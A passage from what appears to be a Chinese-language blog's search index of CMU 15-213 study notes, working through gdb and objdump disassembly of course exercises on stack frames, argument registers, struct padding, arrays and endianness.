%eax,%edi 0x000000000040175a \u003c+42\u003e: callq 0x401d20 \u003ccompute\u003e 0x000000000040175f \u003c+47\u003e: xor %eax,%eax 0x0000000000401761 \u003c+49\u003e: add $0x8,%rsp 0x0000000000401765 \u003c+53\u003e: retq 0x0000000000401766 \u003c+54\u003e: lea 0x938e3(%rip),%rdx # 0x495050 0x000000000040176d \u003c+61\u003e: mov 0xbef54(%rip),%rdi # 0x4c06c8 \u003cstderr\u003e 0x0000000000401774 \u003c+68\u003e: mov $0x1,%esi 0x0000000000401779 \u003c+73\u003e: xor %eax,%eax 0x000000000040177b \u003c+75\u003e: callq 0x44c080 \u003c__fprintf_chk\u003e 0x0000000000401780 \u003c+80\u003e: mov $0x1,%eax 0x0000000000401785 \u003c+85\u003e: jmp 0x401761 \u003cmain+49\u003e End of assembler dump. 这里代码分析如下： c // 初始化 $rdi = 0x1, $rsi = 0x7fffffffdf18。因此 rdi = argc, rsi = argv int main(int argc, char* argv[]) { // 预留8个字节的栈空间 rdx = rip + 0x938e1 -\u003e 这句是干嘛的？ if(edi == 1) { rdi = rip + 0xbef54; -\u003e stderr esi = 0x1; eax = 0; call fprintf eax = 1; // rsp 恢复 return eax; } else { rdi = *(rsi + 0x8); ecx = 0xa; esi = 0; call strtoq; if(eax \u003c 0) { rdx = 0x938e3 + rip; rdi = *(rip + 0xbef54); -\u003e stderr esi = 0x1; eax = 0; call fprintf eax = 1; // rsp 恢复 return eax; } else { edi = eax; call compute eax = 0; // rsp 恢复 return eax; } } } 这里涉及到三个函数：fprintf，strtoq,compute。fprintf通常和stderr结合在一起。 对strtoq进行反汇编得到如下结果： text (gdb) disas strtoq Dump of assembler code for function strtoq: 0x0000000000410310 \u003c+0\u003e: endbr64 0x0000000000410314 \u003c+4\u003e: mov $0xffffffffffffffa8,%rax 0x000000000041031b \u003c+11\u003e: xor %ecx,%ecx 0x000000000041031d \u003c+13\u003e: mov %fs:(%rax),%r8 0x0000000000410321 \u003c+17\u003e: jmpq 0x410370 \u003c____strtoll_l_internal\u003e End of assembler dump. 对compute进行反汇编得到如下结果： text (gdb) disas compute Dump of assembler code for function compute: 0x0000000000401d20 \u003c+0\u003e: endbr64 0x0000000000401d24 \u003c+4\u003e: lea (%rdi,%rdi,2),%edx 0x0000000000401d27 \u003c+7\u003e: lea 0x932de(%rip),%rcx # 0x49500c 0x0000000000401d2e \u003c+14\u003e: mov %edx,%eax 0x0000000000401d30 \u003c+16\u003e: and $0xf,%eax 0x0000000000401d33 \u003c+19\u003e: cmp $0x4,%eax 0x0000000000401d36 \u003c+22\u003e: ja 0x401d53 \u003ccompute+51\u003e 0x0000000000401d38 \u003c+24\u003e: movslq (%rcx,%rax,4),%rax 0x0000000000401d3c \u003c+28\u003e: add %rcx,%rax 0x0000000000401d3f \u003c+31\u003e: notrack jmpq *%rax 0x0000000000401d42 \u003c+34\u003e: nopw 0x0(%rax,%rax,1) 0x0000000000401d48 \u003c+40\u003e: and $0x1,%edx 0x0000000000401d4b \u003c+43\u003e: mov %edx,%eax 0x0000000000401d4d \u003c+45\u003e: jmp 0x401d33 \u003ccompute+19\u003e 0x0000000000401d4f \u003c+47\u003e: nop 0x0000000000401d50 \u003c+48\u003e: sar $0x2,%edx 0x0000000000401d53 \u003c+51\u003e: mov %edx,%eax 0x0000000000401d55 \u003c+53\u003e: and $0xf,%eax 0x0000000000401d58 \u003c+56\u003e: test %edx,%edx 0x0000000000401d5a \u003c+58\u003e: jns 0x401d33 \u003ccompute+19\u003e 0x0000000000401d5c \u003c+60\u003e: retq 0x0000000000401d5d \u003c+61\u003e: nopl (%rax) 0x0000000000401d60 \u003c+64\u003e: add %edx,%edx 0x0000000000401d62 \u003c+66\u003e: jmp 0x401d53 \u003cco","date":"2024-02-29","objectID":"/bomb-lab-recitation/:4:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Bomb lab recitation","uri":"/bomb-lab-recitation/#act4"},{"categories":["系统入门"],"content":" 4 Activity 1输入gdb --args ./calls，输入r，提示如下： text (gdb) r If you didn't run it that way, it will now crash. Otherwise, you will get the (gdb) prompt back. Type 'c' (short for 'continue') at the (gdb) prompt. Program received signal SIGTRAP, Trace/breakpoint trap. main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e) at machine-procedures/calls.c:148 148 machine-procedures/calls.c: No such file or directory. 输入两次c，提示如下： text (gdb) c Continuing. showStack has been called again. Let's look at the contents of the stack right now (just before the pop is executed): (gdb) x/2gx $rsp (Recall that the 'x' command prints memory. The '/2gx' modifier tells it to print two 'g'iant (64-bit) values in he'x'adecimal, and '$rsp' means to start at the current value of the %rsp register, i.e. the stack pointer.) Answer Problem 1 now: fill in the blanks with the value of the stack pointer and the contents of the stack. When you are finished, 'c'ontinue. Program received signal SIGTRAP, Trace/breakpoint trap. 0x00000000004011e1 in showStack () 输入x/2gx $rsp，得到如下信息： text (gdb) x/2gx $rsp 0x7fffffffdde0: 0x0000000000015213 0x000000000040117a 此时$rsp = (void *) 0x7fffffffdde0，其指向的地址的值如上图所示。打印0x000000000040117a处的值，可以看到如下结果： text (gdb) x/2gx 0x000000000040117a 0x40117a \u003cmain+48\u003e: 0xe37e02fb8301c383 0xfea4e800402108bf gdb显示这里是\u003cmain + 48\u003e，那么我们对main函数进行反汇编： text (gdb) disassemble main Dump of assembler code for function main: 0x000000000040114a \u003c+0\u003e: push %rbx 0x000000000040114b \u003c+1\u003e: mov (%rsi),%rsi 0x000000000040114e \u003c+4\u003e: mov $0x402010,%edi 0x0000000000401153 \u003c+9\u003e: mov $0x0,%eax 0x0000000000401158 \u003c+14\u003e: callq 0x401040 \u003cprintf@plt\u003e 0x000000000040115d \u003c+19\u003e: int3 0x000000000040115e \u003c+20\u003e: mov $0x0,%ebx 0x0000000000401163 \u003c+25\u003e: jmp 0x40117d \u003cmain+51\u003e 0x0000000000401165 \u003c+27\u003e: movslq %ebx,%rax 0x0000000000401168 \u003c+30\u003e: mov 0x402e60(,%rax,8),%rdi 0x0000000000401170 \u003c+38\u003e: callq 0x401030 \u003cputs@plt\u003e 0x0000000000401175 \u003c+43\u003e: callq 0x4011db \u003cshowStack\u003e 0x000000000040117a \u003c+48\u003e: add $0x1,%ebx 0x000000000040117d \u003c+51\u003e: cmp $0x2,%ebx 0x0000000000401180 \u003c+54\u003e: jle 0x401165 \u003cmain+27\u003e --Type \u003cRET\u003e for more, q to quit, c to continue without paging-- 0x0000000000401182 \u003c+56\u003e: mov $0x402108,%edi 0x0000000000401187 \u003c+61\u003e: callq 0x401030 \u003cputs@plt\u003e 0x000000000040118c \u003c+66\u003e: int3 0x000000000040118d \u003c+67\u003e: mov $0x402270,%edi 0x0000000000401192 \u003c+72\u003e: callq 0x401030 \u003cputs@plt\u003e 0x0000000000401197 \u003c+77\u003e: int3 0x0000000000401198 \u003c+78\u003e: mov $0x402478,%edi 0x000000000040119d \u003c+83\u003e: callq 0x401030 \u003cputs@plt\u003e 0x00000000004011a2 \u003c+88\u003e: mov $0x0,%eax 0x00000000004011a7 \u003c+93\u003e: pop %rbx 0x00000000004011a8 \u003c+94\u003e: retq End of assembler dump. 可以看到这个值是callq 0x4011db \u003cshowStack\u003e的下一条指令地址，也就是callq调用的返回地址。 输入c继续，提示如下： text (gdb) c Continuing. showStack has been called a third time. Now let's watch it return. GDB provides many commands for advancing through the program other than 'c'ontinue. The 'si' command, for instance, executes a single assembly instruction. Use this command twice now. After each step, print the values of %rsp and %rip: (gdb) si (gdb) p $rsp (gdb) p $rip Based on how %rsp and %rip changed after each instruction, answer Problems 2 and 3 now. When you are finished, 'c'ontinue. Program received signal SIGTRAP, Trace/breakpoint trap. 输入si，%rsp和%rip的值如下： text (gdb) p $rsp $1 = (void *) 0x7fffffffdde8 (gdb) p $rip $2 = (void (*)()) 0x4011e2 \u003cshowStack+7\u003e 对showStack函数进行反汇编可以看到： text (gdb) disassemble showStack Dump of assembler code for function showStack: 0x00000000004011db \u003c+0\u003e: pushq $0x15213 0x00000000004011e0 \u003c+5\u003e: int3 0x00000000004011e1 \u003c+6\u003e: pop %rax =\u003e 0x00000000004011e2 \u003c+7\u003e: retq End of assembler dump. 这里%rip指向的是retq指令，再次打印%rsp和%rip的值可以看到： text (gdb) p $rsp $3 = (void *) 0x7fffffffddf0 (gdb) p $rip $4 = (void (*)()) 0x40117a \u003cmain+48\u003e 这里%rsp的值相对于retq前+8，并且$rip的值等于下一条指令的地址。由此可以推断，此处ret指令将栈顶的地址弹出，并赋值给%rip。那么callq指令做的事就是将下一条指令的地址压栈，然后将%rip的值设置为callq的目标地址。 输入c继续，指令如下： text (gdb) c Continuing. As you've seen, a ret pops a 64-bit address off the top of the stack and jumps to that","date":"2024-02-29","objectID":"/machine-procedures-activity/:1:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Machine procedures activity","uri":"/machine-procedures-activity/#activity-1"},{"categories":["系统入门"],"content":" 5 Activity 2输入gdb --args ./locals，输入r，再输入c，得到的提示如下： text The stack is also used to pass data between procedures, but nowadays most function arguments are passed in registers instead. You have already seen the first two argument-passing registers (%rdi and %rsi, in that order) in use. Dissassemble the function seeArgs. It calls printf with six arguments. Arguments 2-6 are labeled for you in the assembly. Based on what you see in the disasssembly, answer Problem 6. Check your answer using: (gdb) x/s \u003cvalue passed in %rdi\u003e. When you are finished, 'c'ontinue. Program received signal SIGTRAP, Trace/breakpoint trap. main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e) at machine-procedures/locals.c:156 156 in machine-procedures/locals.c 输入disassemble seeArgs，提示如下： text (gdb) disassemble seeArgs Dump of assembler code for function seeArgs: 0x0000000000401152 \u003c+0\u003e: sub $0x8,%rsp 0x0000000000401156 \u003c+4\u003e: mov $0x6,%r9d 0x000000000040115c \u003c+10\u003e: mov $0x5,%r8d 0x0000000000401162 \u003c+16\u003e: mov $0x4,%ecx 0x0000000000401167 \u003c+21\u003e: mov $0x3,%edx 0x000000000040116c \u003c+26\u003e: mov $0x2,%esi 0x0000000000401171 \u003c+31\u003e: mov $0x402016,%edi 0x0000000000401176 \u003c+36\u003e: mov $0x0,%eax 0x000000000040117b \u003c+41\u003e: callq 0x401050 \u003cprintf@plt\u003e 0x0000000000401180 \u003c+46\u003e: add $0x8,%rsp 0x0000000000401184 \u003c+50\u003e: retq End of assembler dump. 第一个传入的参数保存在%edi中，其值是0x402016。估摸着是int类型。输入x/s 0x402016，显示： text (gdb) x/s 0x402016 0x402016: \"%d %d %d %d %d\" 确实是int类型，那么此处猜测x/s是打印从该处开始的字符串。 输入c，提示如下： text (gdb) c Continuing. Now disassemble the function seeMoreArgs. It calls printf with eight arguments. Based on what you see in the disasssembly, answer Problem 7. When you are finished, 'c'ontinue. Program received signal SIGTRAP, Trace/breakpoint trap. main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e) at machine-procedures/locals.c:156 输入disassemble seeMoreArgs，输出如下： text (gdb) disassemble seeMoreArgs Dump of assembler code for function seeMoreArgs: 0x0000000000401185 \u003c+0\u003e: sub $0x8,%rsp 0x0000000000401189 \u003c+4\u003e: pushq $0x8 0x000000000040118b \u003c+6\u003e: pushq $0x7 0x000000000040118d \u003c+8\u003e: mov $0x6,%r9d 0x0000000000401193 \u003c+14\u003e: mov $0x5,%r8d 0x0000000000401199 \u003c+20\u003e: mov $0x4,%ecx 0x000000000040119e \u003c+25\u003e: mov $0x3,%edx 0x00000000004011a3 \u003c+30\u003e: mov $0x2,%esi 0x00000000004011a8 \u003c+35\u003e: mov $0x402010,%edi 0x00000000004011ad \u003c+40\u003e: mov $0x0,%eax 0x00000000004011b2 \u003c+45\u003e: callq 0x401050 \u003cprintf@plt\u003e 0x00000000004011b7 \u003c+50\u003e: add $0x18,%rsp 0x00000000004011bb \u003c+54\u003e: retq End of assembler dump. 第 7 个和第 8 个被压在栈上。寄存器只有 6 个，多的就压在栈上。 输入c，提示如下： text (gdb) c Continuing. The stack can also be used to store local variables. Now disassemble the function getV. It contains a local array of 4 ints. (The compiler has chosen to reserve some extra stack space.) Based on what you see in the disasssembly, answer Problems 7 and 8. When you are finished, 'c'ontinue. Program received signal SIGTRAP, Trace/breakpoint trap. main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e) at machine-procedures/locals.c:156 输入disassemble getV，结果如下： text (gdb) disassemble getV Dump of assembler code for function getV: 0x00000000004011bc \u003c+0\u003e: sub $0x18,%rsp 0x00000000004011c0 \u003c+4\u003e: movslq %edi,%rsi 0x00000000004011c3 \u003c+7\u003e: mov %rsp,%rdi 0x00000000004011c6 \u003c+10\u003e: callq 0x401284 \u003cgetValue\u003e 0x00000000004011cb \u003c+15\u003e: add $0x18,%rsp 0x00000000004011cf \u003c+19\u003e: retq End of assembler dump. getV的调用过程如下： %rsp - 24，留出 24 个字节的位置 %rsi = %edi, %rdi = %rsp 将%rsp的位置通过%rdi传入。%rsp指向数组的起始位置。 对getValue进行反汇编结果如下： text (gdb) disassemble getValue Dump of assembler code for function getValue: 0x0000000000401284 \u003c+0\u003e: mov (%rdi,%rsi,4),%eax 0x0000000000401287 \u003c+3\u003e: retq End of assembler dump. 输入c继续，结果如下： text (gdb) c Continuing. There are also rules for whether a function is allowed to change the value in each register--all the registers, not just those used for arguments. Each register is either call-preserved or call-clobbered. When a function returns, all the call-preserved registers must have the same values that they did when the function was called. That me","date":"2024-02-29","objectID":"/machine-procedures-activity/:2:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Machine procedures activity","uri":"/machine-procedures-activity/#activity-2"},{"categories":["系统入门"],"content":" 6 Activity 3重新运行gdb -args ./calls，运行到showStack处，打印$rip前 3 个字节，得到如下结果： text (gdb) x/3b $rsp 0x7fffffffdde0: 0x13 0x52 0x01 可以看到数字0x15213的高位存放在高字节中，低位存放在低字节中，该机器使用的是小端法。 ","date":"2024-02-29","objectID":"/machine-procedures-activity/:3:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Machine procedures activity","uri":"/machine-procedures-activity/#activity-3"},{"categories":["系统入门"],"content":"输入gdb ./data-layout，开启Data activity之旅。 ","date":"2024-02-29","objectID":"/machine-data-activity/:0:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Machine data activity","uri":"/machine-data-activity/#"},{"categories":["系统入门"],"content":" 7 Integers and Local VariablesreturnOne的 C 语言版本如下： c int returnOne (void) { int local = -1; return abs(local); } 输入disassemble returnOne，得到如下结果： text (gdb) disassemble returnOne Dump of assembler code for function returnOne: 0x0000000000400581 \u003c+0\u003e: sub $0x8,%rsp 0x0000000000400585 \u003c+4\u003e: mov $0xffffffff,%edi 0x000000000040058a \u003c+9\u003e: callq 0x400613 \u003cabs\u003e 0x000000000040058f \u003c+14\u003e: add $0x8,%rsp 0x0000000000400593 \u003c+18\u003e: retq End of assembler dump. 可以看到首先我们为returnOne预留了 8 个字节的栈空间。将0xffffffff放入%edi（应该是传入函数的第一个参数寄存器）。然后调用abs，最后还原栈空间。 对abs进行反汇编结果如下： text (gdb) disassemble abs Dump of assembler code for function abs: 0x0000000000400613 \u003c+0\u003e: mov %edi,%edx 0x0000000000400615 \u003c+2\u003e: sar $0x1f,%edx 0x0000000000400618 \u003c+5\u003e: mov %edi,%eax 0x000000000040061a \u003c+7\u003e: xor %edx,%eax 0x000000000040061c \u003c+9\u003e: sub %edx,%eax 0x000000000040061e \u003c+11\u003e: retq End of assembler dump. abs所做的是把%edi放入%edx，然后将其右移 31 位（也就是让符号位充满），将其和原值相异或，然后再减去全符号位。最后返回%eax。此处local变量应该是存储在寄存器%edi中。这里的问题是如果local不在栈上，那么我们就没有办法获取它的地址。如果需要local的地址的话，我们可能需要将其压在栈上，然后使用leaq %rsp, %rdi获取它的地址。 为了验证我们的结论，我们对returnOneTwo进行反汇编： text (gdb) disassemble returnOneTwo Dump of assembler code for function returnOneTwo: 0x0000000000400594 \u003c+0\u003e: sub $0x18,%rsp 0x0000000000400598 \u003c+4\u003e: movl $0xffffffff,0xc(%rsp) 0x00000000004005a0 \u003c+12\u003e: lea 0xc(%rsp),%rdi 0x00000000004005a5 \u003c+17\u003e: callq 0x40061f \u003cabsp\u003e 0x00000000004005aa \u003c+22\u003e: add $0x18,%rsp 0x00000000004005ae \u003c+26\u003e: retq End of assembler dump. 该函数所做的是预留 24 个字节的空间，然后把0xffffffff放入M[%rsp + 12]的位置上，并且将指向该位置的指针赋给%rdi，随后调用absp。由此推测，absp的传入参数是一个指针（%rdi中）。调用完成后恢复栈空间。 因此，absp的函数原型应该是int absp(int* p)。 ","date":"2024-02-29","objectID":"/machine-data-activity/:1:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Machine data activity","uri":"/machine-data-activity/#integers-and-local-variables"},{"categories":["系统入门"],"content":" 8 Arraysx的几种不同格式的显示见此。这里的显示需要指明 3 个内容： 显示几个单位 每个单位几个字节：如 b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes（如果不指定，默认 1 字节） 用几进制显示：b就是 2 进制，x就是 16 进制，d就是 10 进制 使用x/4b courses只能查看 4 个字节，以 10 进制数显示，结果如下： text (gdb) x/4b courses 0x601110 \u003ccourses\u003e: 19 82 1 0 使用x/4x courses只能查看 4 个字节，以 16 进制数显示，结果如下： text (gdb) x/4x courses 0x601110 \u003ccourses\u003e: 0x13 0x52 0x01 0x00 使用x/4wx courses查看courses处的 4 个int类型值。w是 4 个字节。结果如下： text (gdb) x/4wx courses 0x601110 \u003ccourses\u003e: 0x00015213 0x00015513 0x00018213 0x00018600 可以看到courses处存放了 4 个值：15213 15513 18213 18600，对应数组中的 4 个元素。 getNth函数的 C 语言形式如下： c int getNth(int *arr , size_t index) { return arr[index]; } 其中%rdi是数组的起始位置(arr)，%rsi是索引(index)。因为一个int类型是 4 个字节，因此计算地址的时候是*(rdi + 4 * rsi) 对getNth函数进行反汇编可得： text (gdb) disassemble getNth Dump of assembler code for function getNth: 0x00000000004005af \u003c+0\u003e: mov (%rdi,%rsi,4),%eax 0x00000000004005b2 \u003c+3\u003e: retq End of assembler dump. 重新运行，输入一次c，输入x/bx $rdi可得： text (gdb) x/s $rdi 0x4007f8: \"15213 CSAPP\" 此处的字符串是15213 CSAPP。（推测x/s $rdi的意思以字符串的形式打印从$rdi开始的内存）。输入x/12bx $rdi，可以得到如下结果： text (gdb) x/12bx $rdi 0x4007f8: 0x31 0x35 0x32 0x31 0x33 0x20 0x43 0x53 0x400800: 0x41 0x50 0x50 0x00 字符串的结尾是0x00，x/s命令应该是通过0x00判断字符串的结尾，进而计算字符串的长度的。 ","date":"2024-02-29","objectID":"/machine-data-activity/:2:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Machine data activity","uri":"/machine-data-activity/#arrays"},{"categories":["系统入门"],"content":" 9 Structs定义struct course如下： c struct course { int cs_ugrad; int cs_grad; int ece_ugrad ; int ece_grad; }; 继续输入c，handout 提示断点处的函数将struct course结构的值作为传入参数，使用 x/4wx $rdi查看%rdi处的内存可以看到： text (gdb) x/4wx $rdi 0x601100 \u003ccourse\u003e: 0x00015213 0x00015513 0x00018213 0x00018600 我们可以发现该处的四个值就是：0x15213 0x15513 0x18213 0x18600 我们定义结构体： c struct increasing { char a; short b; int c; long d; }; 假设 c a = 0x0a; b = 0x0b0b; c = 0x0c0c0c0c; d = 0x0d0d0d0d0d0d0d0d; 继续输入c，我们使用x/32bx $rdi来查看结构体内容，内容如下： text (gdb) x/32bx $rdi 0x6010e0 \u003cincreasing\u003e: 0x0a 0x00 0x0b 0x0b 0x0c 0x0c 0x0c 0x0c 0x6010e8 \u003cincreasing+8\u003e: 0x0d 0x0d 0x0d 0x0d 0x0d 0x0d 0x0d 0x0d 0x6010f0 \u003cincreasing+16\u003e: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x6010f8 \u003cincreasing+24\u003e: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 和我们料想的情况一致。 将结构体内容重新排列如下： c struct rearranged { char a; long b; short c; int d; }; 这种方法按理论来说应该比上面那种多用 8 个字节。结果验证如下： text (gdb) x/32bx rearranged 0x6010a0 \u003crearranged\u003e: 0x0a 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x6010a8 \u003crearranged+8\u003e: 0x0b 0x0b 0x0b 0x0b 0x0b 0x0b 0x0b 0x0b 0x6010b0 \u003crearranged+16\u003e: 0x0c 0x0c 0x00 0x00 0x0d 0x0d 0x0d 0x0d 0x6010b8 \u003crearranged+24\u003e: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 ","date":"2024-02-29","objectID":"/machine-data-activity/:3:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Machine data activity","uri":"/machine-data-activity/#structs"},{"categories":["系统入门"],"content":" 10 Arrays of Structs有结构体如下： c struct pair { int large; char small; }; struct pair pairs [2] = { {0 xabababab , 0x1}, {0 xcdcdcdcd , 0x2} }; 每个pair应该是 8 个字节。因为int类型占 4 个字节，char类型占 1 个字节。此外结构体的长度必须是结构体中体积最大的类型的整数倍，该结构体中最大的是int类型，4 个字节，因此结构体的长度必须是 4 个字节的倍数，因此是 8 个字节，需要在char后再加 3 个字节的padding。pairs是一个包含两个结构体变量的数组，1 个变量是 8 个字节，2 个就是 16 个字节。 我们验证一下(此处pairs也可以替换成\u0026pairs)： text (gdb) x/16bx pairs 0x601080 \u003cpairs\u003e: 0xab 0xab 0xab 0xab 0x01 0x00 0x00 0x00 0x601088 \u003cpairs+8\u003e: 0xcd 0xcd 0xcd 0xcd 0x02 0x00 0x00 0x00 此外，结构体中可以包含数组，此时结构体的alignment = max(数组中最大元素，结构体其他元素)。例如： c struct triple { short large [2]; char small; }; 其中short类型 2 个字节，char类型 1 个字节。该结构体的长度 = 2 字节的整数倍。 ","date":"2024-02-29","objectID":"/machine-data-activity/:4:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Machine data activity","uri":"/machine-data-activity/#arrays-of-structs"},{"categories":["系统入门"],"content":" 11 2-D Arrays一个嵌套的数组如下： c int8_t nested [2][3] = {{0x00 , 0x01 , 0x02}, {0x10 , 0x11 , 0x12 }}; 输入如下命令查看内存nested处的值： text (gdb) x/6bx nested 0x601076 \u003cnested\u003e: 0x00 0x01 0x02 0x10 0x11 0x12 可以看到一个单元是 1 个字节，一共 6 个单元。数组元素按照行顺序排列。 函数access的 C 版本如下： c int8_t access(int8_t (* arr)[3], size_t row, size_t column) { return arr[row][column]; } 仔细查了一下资料，在 C 语言中这里有两种写法要注意一下区分： c int (*arr)[10]; // 定义一个指针arr，指向一个包含 10 个元素的数组，arr 可以是 new int[n][3], 它可以是个二维数组 int* arr[10]; // 定义一个包含 10 个元素的数组，其中每个元素都是一个int类型的指针，其起始地址为 arr 这样声明的原因是：[]运算符的优先级比*高，因此需要通过()来把*arr括起来。 由此，access函数的传入参数arr是一个指针，该指针指向一个 3 个元素的数组。可以有n个这样的指针，构成一个二维数组。如arr = new int[n][3]，那么arr有 n 行，每行都是一个指向三个元素的数组。这种表示不能用于第二维度（列）不等于 3 的数组，如int flipped [3][2]。 如果要将 C 语言版本的access转化为汇编指令，\u0026arr[row][col] = arr + row * 3 + col（因为这里每个int都是一个字节，因此不需要乘上多余的sizeof(T)，否则就需要乘上sizeof(T)。可以使用一个寄存器作为arr，计算3 * row，再加上col，最后对指针解引，放到返回值中。 对函数access进行反汇编，得到如下指令： text (gdb) disassemble access Dump of assembler code for function access: 0x00000000004005b5 \u003c+0\u003e: lea (%rsi,%rsi,2),%rax ;; rax = 3 * rsi 0x00000000004005b9 \u003c+4\u003e: add %rax,%rdi ;; rdi += 3 * rsi 0x00000000004005bc \u003c+7\u003e: movzbl (%rdi,%rdx,1),%eax ;; eax = *(rdi + 3 * rsi + rdx) 0x00000000004005c0 \u003c+11\u003e: retq End of assembler dump. 这里我想%rdi是arr的基地址，%rsi是row，rdx是col。我们首先计算了3 * rsi，将其加到%rdi中，然后计算3 * %rsi + %rdx。 现在给 3 个数组： c int8_t first [3] = {0x00 , 0x01 , 0x02 }; int8_t second [3] = {0x10 , 0x11 , 0x12 }; int8_t * multilevel [2] = {first , second }; 这里multilevel是一个嵌套的数组，其第一个元素first是一个 3 个字节的数组，其本身是个指针。第二个元素second同理。 multilevel的每个元素是 8 个字节。数组的每个元素是 1 个字节。输入如下指令检验： text (gdb) x/2gx multilevel 0x601060 \u003cmultilevel\u003e: 0x0000000000601073 0x0000000000601070 (gdb) x/3bx first 0x601073 \u003cfirst\u003e: 0x00 0x01 0x02 (gdb) x/3bx multilevel[0] 0x601073 \u003cfirst\u003e: 0x00 0x01 0x02 (gdb) p \u0026first $4 = (int8_t (*)[3]) 0x601073 \u003cfirst\u003e (gdb) p \u0026second $5 = (int8_t (*)[3]) 0x601070 \u003csecond\u003e 将上述 C 语言程序换成如下程序： c int8_t accessMultilevel (int8_t **arr , size_t row , size_t column) { return arr[row][column]; } 这里将int8_t (*arr)[3]换成了int8_t **arr，也就是说这个arr可以指向一个二维数组，而这个二维数组的长和宽可以不定。 这里的计算公式就是a[row][col] = *(*(arr + row * 8) + column)(因为int8_t是 1 个字节，所以无需乘上sizeof(T))。此处arr应该是基地址，row存储在一个寄存器中，column存储在一个寄存器中。 对该函数进行反汇编，结果如下： text (gdb) disassemble accessMultilevel Dump of assembler code for function accessMultilevel: 0x00000000004005c1 \u003c+0\u003e: add (%rdi,%rsi,8),%rdx ;; %rdx += *(%rdi + 8 * %rsi) 0x00000000004005c5 \u003c+4\u003e: movzbl (%rdx),%eax ;; %eax = *(%rdx) 0x00000000004005c8 \u003c+7\u003e: retq End of assembler dump. 这里%rdx中存储的是column，%rdi中存储的是arr的基地址，%rsi中存储的是row。如果first和second都含有 4 个元素的话，地址的计算不影响。但是如果俩数组长度不一样，那么索引的时候可能会出现地址越界的问题。 如果数组这样定义： c int8_t * multilevel [2] = {first, first}; 那么如果修改一个first的元素值的话，两个索引指向同一个数组，两索引对应数组那个值都会改变。 ","date":"2024-02-29","objectID":"/machine-data-activity/:5:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Machine data activity","uri":"/machine-data-activity/#2-d-arrays"},{"categories":["系统入门"],"content":" 12 Endianness (Optional)还是之前那个courses结构体，我们先按照 4 个字节一组的单位打印它的值看看，再按照 1 个字节一组为单位打印前 4 个字节看看： text (gdb) x/4wx courses 0x601110 \u003ccourses\u003e: 0x00015213 0x00015513 0x00018213 0x00018600 (gdb) x/4bx courses 0x601110 \u003ccourses\u003e: 0x13 0x52 0x01 0x00 我们可以看到一个数(int类型，4 个字节)，按照 4 个字节一组打印的时候，显示的是0x15213，但是按照单个字节打印的时候发现低地址字节存放在低地址处，高地址字节存放在高地址处，因此该机器为小端序机器。小端序机器的缺陷在于不方便单字节读取，字节的顺序是倒过来的。 但是小端序机器也有优点，narrowingCast函数的 C 语言版本如下： c int narrowingCast (long *num) { return (int) *num; } 我们对narrowingCast函数进行反汇编，得到如下结果： text (gdb) disassemble narrowingCast Dump of assembler code for function narrowingCast: 0x00000000004005c9 \u003c+0\u003e: mov (%rdi),%eax 0x00000000004005cb \u003c+2\u003e: retq End of assembler dump. 这个函数的功能是，将一个long*类型的指针解引，然后把它指向的地址的 4 个字节赋给%eax。 这里的一个问题是，对于一个数字：0x0000000012345678。如果是小端法，低位字节存储在%rsp处，一直到%rsp + 3。而如果是大端法，低位字节存储在%rsp + 7，高位字节存储在%rsp + 4。因此如果是大端法，就没法用mov (%rdi),%eax来获取值，而应该用mov 4(%rdi),%eax来获取值 ","date":"2024-02-29","objectID":"/machine-data-activity/:6:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Machine data activity","uri":"/machine-data-activity/#endianness-optional"},{"categories":["系统入门"],"content":" 6 Basic Control Flow首先回答 Q1：为什么 JZ 和 JE 指令相同？ 对于 JZ，即 jump if zero，在跳转之前，我们首先需要将其与 0 做差，判断结果的 ZF 是否等于 1。对于 JE，我们首先将两数做差（也可以使用testq指令？），然后判断 ZF 是否等于 1。JZ 和 JE 都是对 ZF 进行判断，然后进行跳转。 然后我们回答 Q2：首先阅读jumps.S。我们发现jumps.S就是以jump_insns开头的一群跳转指令的集合。然后我们输入如下指令： bash $ as jumps.S -o jumps.o $ objdump -d jumps.o 其结果如下： asm jumps.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003cjump_insns\u003e: 0: eb 34 jmp 36 \u003cdestination\u003e 2: 70 32 jo 36 \u003cdestination\u003e 4: 71 30 jno 36 \u003cdestination\u003e 6: 72 2e jb 36 \u003cdestination\u003e 8: 72 2c jb 36 \u003cdestination\u003e a: 72 2a jb 36 \u003cdestination\u003e c: 73 28 jae 36 \u003cdestination\u003e e: 73 26 jae 36 \u003cdestination\u003e 10: 73 24 jae 36 \u003cdestination\u003e 12: 74 22 je 36 \u003cdestination\u003e 14: 74 20 je 36 \u003cdestination\u003e 16: 75 1e jne 36 \u003cdestination\u003e 18: 75 1c jne 36 \u003cdestination\u003e 1a: 76 1a jbe 36 \u003cdestination\u003e 1c: 76 18 jbe 36 \u003cdestination\u003e 1e: 77 16 ja 36 \u003cdestination\u003e 20: 77 14 ja 36 \u003cdestination\u003e 22: 78 12 js 36 \u003cdestination\u003e 24: 79 10 jns 36 \u003cdestination\u003e 26: 7c 0e jl 36 \u003cdestination\u003e 28: 7c 0c jl 36 \u003cdestination\u003e 2a: 7d 0a jge 36 \u003cdestination\u003e 2c: 7d 08 jge 36 \u003cdestination\u003e 2e: 7e 06 jle 36 \u003cdestination\u003e 30: 7e 04 jle 36 \u003cdestination\u003e 32: 7f 02 jg 36 \u003cdestination\u003e 34: 7f 00 jg 36 \u003cdestination\u003e 0000000000000036 \u003cdestination\u003e: 36: c3 retq 